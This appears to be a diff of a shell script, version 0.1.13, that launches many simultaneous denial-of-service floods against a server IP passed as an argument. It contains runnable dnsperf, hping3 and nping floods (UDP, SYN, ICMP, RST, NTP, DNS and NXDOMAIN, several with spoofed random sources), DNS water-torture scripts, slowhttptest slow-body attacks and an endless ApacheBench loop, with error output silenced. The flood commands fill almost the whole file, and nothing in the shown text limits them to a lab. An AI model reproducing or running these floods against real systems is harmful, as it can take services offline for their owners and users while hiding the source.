@@ -1,7 +1,7 @@
 #!/bin/sh
 # Christopher Gray
-# Version 0.1.12
-#  6-22-18
+# Version 0.1.13
+#  10-25-18
 
 if [ -z "$1" ]
 then
@@ -52,25 +52,33 @@ fi
 # -v     Verbose: report the RCODE of each response on stdout.
 # -h     Print the usage of dnsperf.
 
-#little traffic
-#sudo dnsperf -s $server_ip -d queryfile-example-current -c 200 -T 10 -l 300 -q 10000 -Q 25
+if [ -f queryfile-example-current ]
+then
+      #little traffic
+      #sudo dnsperf -s $server_ip -d queryfile-example-current -c 200 -T 10 -l 300 -q 10000 -Q 25
 
-#Flood: 
-sudo dnsperf -s $server_ip -d queryfile-example-current -c 200 -T 10 -l 300 -q 10000 -Q $queries_ps &
-wait
+      #Flood: 
+      sudo dnsperf -s $server_ip -d queryfile-example-current -c 200 -T 10 -l 300 -q 10000 -Q $queries_ps 2> /dev/null &
+      wait
+fi
 
-# Webflow
-./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://myseceureserver/resources/loginform.html -x 10 -p 3 &
+if [ -f test.net.txt ]
+then
+      dnsperf -s $server_ip -d test.net.txt -b 100000  -t 2 -c 100 -q 100000 -l 300 2> /dev/null &
+fi
+
+#-----------------------------------------------------------------------------------------------------------------
+# Hping3 Attacks
+hping3 --flood --rand-source --udp -p 53 $server_ip 2> /dev/null &
+hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $server_ip 2> /dev/null &
+hping3 $server_ip --udp -d 1400 -p ++2001 -s 53 --keep -c 1000000 --faster --rand-source 2> /dev/null &
+hping3 $server_ip -p 80 –SF --flood 2> /dev/null &
+hping3 $server_ip --icmp --flood --rand-source 2> /dev/null &
+hping3 --verbose --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --morefrag --baseport 49877 --destport 80 $server_ip 2> /dev/null &
 
 #------ Attack traffic ----------
-python attack_dns_nxdomain.py $server_ip google.com 10000 &
-./attack_dns_watertorture_wget.sh google.com &
-
-#---- apache bench attack ----
-while true
-do
-    ab -r -c 1000 -n 1000000 $server_ip  &>/dev/null
-done
+python attack_dns_nxdomain.py $server_ip example.com 10000 2> /dev/null &
+./attack_dns_watertorture_wget.sh example.com 2> /dev/null &
 
 #-----------------------------------------------------------------------------------------------------------------
 RATE=5000
@@ -81,17 +89,27 @@ VALID_DNS_QUERY="000001000001000000000000037177650474657374036c61620000010001"
 INEXISTENT_DNS_QUERY="0000000000010000000000000c6e6f73756368646f6d61696e08696e7465726e616c036c61620000010001"
 
 # A query flood
-nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $VALID_DNS_QUERY  $OUTPUT &
+nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $VALID_DNS_QUERY  $OUTPUT 2> /dev/null &
 #NX domain flood
-nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $INEXISTENT_DNS_QUERY $OUTPUT &
+nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $INEXISTENT_DNS_QUERY $OUTPUT 2> /dev/null &
 #NTP flood
-nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 123 --data-length 100 $OUTPUT &
+nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 123 --data-length 100 $OUTPUT 2> /dev/null &
 #SYN Flood
-nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags SYN -p 22 $OUTPUT &
+nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags SYN -p 22 $OUTPUT 2> /dev/null &
 #ICMP Flood
-nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --icmp $OUTPUT &
+nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --icmp $OUTPUT 2> /dev/null &
 #RST Flood
-nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags RST -p 22 $OUTPUT &
+nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags RST -p 22 $OUTPUT 2> /dev/null &
 
 #-----------------------------------------------------------------------------------------------------------------
+
+#--- Webflow -----
+./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://myseceureserver/resources/loginform.html -x 10 -p 3 2> /dev/null &
+
+#---- apache bench attack ----
+while true
+do
+    ab -r -c 1000 -n 1000000 $server_ip  &>/dev/null &
+done
+
 echo "DONE \r\n \r\n"
